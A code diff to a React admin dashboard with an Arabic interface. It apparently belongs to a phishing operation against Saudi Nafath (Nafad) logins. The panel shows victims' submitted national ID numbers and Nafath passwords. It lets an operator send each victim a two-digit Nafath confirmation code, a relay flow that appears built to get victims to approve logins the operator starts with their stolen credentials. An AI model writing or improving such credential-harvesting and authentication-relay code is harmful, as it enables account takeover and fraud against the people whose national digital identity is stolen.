@@ -644,8 +644,12 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const raw = selectedRequest?.raw;
 
-    // Only show this box when at step 8 OR if nafad data exists
-    if (currentStep !== 8 && !raw?.nafadCode) {
+    // Get nafad data
+    const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
+    const adminNafadCode = raw?.adminNafadCode;
+    
+    // Show box if there's nafad data OR admin sent code OR at step 8
+    if (!hasNafadData && !adminNafadCode && currentStep !== 8) {
       return null;
     }
 
@@ -654,22 +658,81 @@ export default function DashboardPage() {
         <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🔐</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-            صندوق رمز النفاذ (Nafad)
+            صندوق التحقق من النفاذ
           </h3>
           <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 5</span>
         </div>
         
-        {/* Status message */}
-        {raw?.nafadCode && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>
-              ✅ تم إرسال رمز النفاذ: {raw.nafadCode}
-            </p>
+        {/* Nafad credentials - show when submitted */}
+        {hasNafadData && (
+          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
+            {raw?.nafadIdNumber && (
+              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
+                رقم الهوية: <strong dir="ltr">{raw.nafadIdNumber}</strong>
+              </p>
+            )}
+            {raw?.nafadPassword && (
+              <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
+                كلمة المرور: <strong dir="ltr">{"*".repeat(String(raw.nafadPassword).length)}</strong>
+              </p>
+            )}
           </div>
         )}
-        {currentStep === 8 && !raw?.nafadCode && (
+        
+        {/* Input for nafad code - show only if no code sent yet */}
+        {!adminNafadCode && hasNafadData && (
+          <div style={{ marginBottom: 12 }}>
+            <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#374151", fontWeight: 600 }}>
+              أدخل رمز النفاذ لإرساله للعميل:
+            </p>
+            <div style={{ display: "flex", gap: 8 }}>
+              <input
+                type="tel"
+                maxLength={2}
+                value={nafadInput}
+                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                placeholder="00"
+                style={{
+                  flex: 1,
+                  padding: "10px 16px",
+                  borderRadius: 8,
+                  border: "2px solid #e5e7eb",
+                  fontSize: "1.2rem",
+                  textAlign: "center",
+                  fontWeight: 700,
+                }}
+              />
+              <button
+                onClick={handleSendNafadCode}
+                disabled={actionLoading === "nafad" || !nafadInput}
+                style={{
+                  padding: "10px 20px",
+                  borderRadius: 8,
+                  border: "none",
+                  background: nafadInput ? "#22c55e" : "#9ca3af",
+                  color: "#fff",
+                  fontWeight: 700,
+                  cursor: nafadInput ? "pointer" : "not-allowed",
+                }}
+              >
+                {actionLoading === "nafad" ? "جاري..." : "📤 إرسال"}
+              </button>
+            </div>
+          </div>
+        )}
+        
+        {/* Status when code sent */}
+        {adminNafadCode && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 16, border: "2px solid #86efac", marginBottom: 12, textAlign: "center" }}>
+            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إرسال رمز النفاذ:</p>
+            <p style={{ margin: 0, fontSize: "2.5rem", fontWeight: 700, color: "#166534", letterSpacing: "0.5em" }}>{adminNafadCode}</p>
+          </div>
+        )}
+        
+        {/* Waiting message */}
+        {!adminNafadCode && hasNafadData && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز النفاذ</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إرسال رمز النفاذ</p>
           </div>
         )}
       </div>
